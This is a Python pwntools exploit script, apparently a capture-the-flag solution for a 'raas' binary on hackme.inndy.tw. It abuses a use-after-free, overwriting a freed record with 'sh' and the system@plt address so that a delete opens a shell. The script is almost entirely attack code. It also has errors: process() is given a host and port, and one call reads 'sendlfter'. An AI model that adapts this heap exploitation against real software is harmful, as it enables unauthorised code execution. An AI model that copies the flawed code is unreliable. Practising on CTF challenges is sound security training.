#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys

if sys.argv[1] == "r":
    io = process("hackme.inndy.tw", 7719)
    elf = ELF("./raas")
else:
    io = process("./raas")
    elf = ELF("./raas")
    
sys_plt = elf.plt["system"]

def New(idx, tp, val, length = 0):
    io.sendlineafter("Act > ", "1")
    io.sendlineafter("Index > ", str(idx))
    io.sendlineafter("Type > ", str(tp))

    if tp == 2:
        io.sendlfter("Length > ", str(length))

    io.sendafter("Value > ", val)


def Del(idx):
    io.sendlineafter("Act > ", "2")
    io.sendlineafter("Index > ", str(idx))

def Show(idx):
    io.sendlineafter("Act > ", "3")
    io.sendlineafter("Index > ", str(idx))

def uaf():
    log.info("Step 1: free")
    New(1, 1, "1234")
    New(2, 1, "1234")

    Del(1)
    Del(2)
    pause()

    log.info("Step 2: after")
    payload = "sh\x00\x00" + p32(sys_plt) + "aaa"
    New(3, 2, payload, 12)
    New(4, 2, "aaaa", 7)
    pause()

    log.info("Step 3: use")
    Del(2)
    io.interactive()
    io.close()

if __name__ == "__main__":
    uaf()
